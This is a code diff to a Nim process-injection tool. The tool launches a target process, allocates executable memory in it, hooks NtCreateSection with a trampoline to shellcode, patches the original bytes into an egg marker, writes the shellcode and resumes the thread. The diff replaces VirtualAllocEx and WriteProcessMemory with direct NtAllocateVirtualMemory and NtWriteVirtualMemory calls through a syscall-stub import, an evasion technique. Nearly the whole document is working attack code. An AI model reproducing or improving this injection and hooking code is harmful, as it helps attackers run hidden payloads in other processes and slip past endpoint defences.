@@ -1,6 +1,7 @@
 import winim
 import dynlib
 import Hook
+import GetSyscallStub
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
@@ -44,9 +45,13 @@ proc StartProcess(): void =
     tHandle = pi.hThread
 StartProcess()
 
-Sleep(2000)
-
+#echo "Waiting for debugger attaching"
+Sleep(1000)
+#var input = readLine(stdin)
+#echo GetLastError()
+echo "-------------------------------------------------------------------"
 echo "[*] Target Process: ", remoteProcID
+
 
 import dynlib
 
@@ -70,18 +75,21 @@ var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
 
 var rPtr: LPVOID
 
-#let pHandle = OpenProcess(PROCESS_ALL_ACCESS,false,cast[DWORD](remoteProcID))
-
 echo "[*] pHandle: ", tProcess
 
-rPtr = VirtualAllocEx(
-    tProcess,
-    NULL,
-    cast[SIZE_T](hookShellcodeBytes.len),
-    MEM_COMMIT,
-    PAGE_EXECUTE_READ_WRITE
-)
+var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
+var status: NTSTATUS
 
+status = NtAllocateVirtualMemory(
+    tProcess, &rPtr, 0, &sc_size, 
+    MEM_COMMIT,
+    PAGE_EXECUTE_READWRITE)
+
+if(status == 0):
+    echo "[+] NtAllocateVirtualMemory success!"
+else:
+    echo "[-] NtAllocateVirtualMemory failed!"
+    quit(1)
 
 if(rPtr != nil):
     echo "[+] Successfully allocated remote process memory for the shellcode"
@@ -90,7 +98,7 @@ else:
     quit(1)
 
 echo "-------------------------------------------------------------------"
-Sleep(2000)
+Sleep(10000)
 
 var buffers: HookTrampolineBuffers
 
@@ -109,8 +117,8 @@ copyMem(PointerToOrigBytes, addressToHook, 24)
 
 echo "[*] Writing allocated Shellcode address ", repr(rPtr), " into Original NtCreateSection address as hook: "
 
-output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
 
+output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
 if(output):
     echo "[+] Remotely Hooked NtCreateSection: ", output
 else:
@@ -118,7 +126,7 @@ else:
     quit(1)
 
 echo "-------------------------------------------------------------------"
-Sleep(2000)
+Sleep(10000)
 
 # We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
 # To do that, we need to find the egg in the Shellcode and replace it with the original bytes.
@@ -128,26 +136,32 @@ echo "[*] Searching for egg in the shellcode..."
 var eggIndex = 0
 for i in 0 ..< hookShellcodeBytes.len:
     if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
-        echo "[+] Found egg at index: ", i
+        echo "[*] Found egg at index: ", i
         eggIndex = i
         break
-
 # Write the original bytes into the egg
-echo "[*] Modifying shellcode to add original NtCreateSection bytes"
+echo "[*] Writing original bytes into egg"
 copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
 echo "[*] Done."
 
 # Finally write the shellcode into the remote process
 var bytesWritten: SIZE_T
-let wSuccess = WriteProcessMemory(tProcess,rPtr,unsafeAddr hookShellcodeBytes[0],cast[SIZE_T](hookShellcodeBytes.len),addr bytesWritten)
 
-if(wSuccess):
-    echo "[+] WriteProcessMemory: ", bool(wSuccess)
+status = NtWriteVirtualMemory(
+        tProcess, 
+        rPtr, 
+        unsafeAddr hookShellcodeBytes[0], 
+        sc_size-1, 
+        addr bytesWritten);
+
+if (status == 0):
+    echo "[+] NtWriteVirtualMemory: ", status
     echo "    \\-- bytes written: ", bytesWritten
     echo ""
 else:
-    echo "[-] WriteProcessMemory failed!"
+    echo "[-] NtWriteVirtualMemory failed!"
     quit(1)
+
 
 ####################################################################
 
@@ -155,9 +169,13 @@ else:
 # Time to resume the process
 
 echo "-------------------------------------------------------------------"
-Sleep(2000)
+Sleep(10000)
 
 echo "[*] Resuming the process"
+
+echo "-------------------------------------------------------------------"
+Sleep(5000)
+
 ResumeThread(tHandle)
 
-Sleep(4000)
+Sleep(1000)
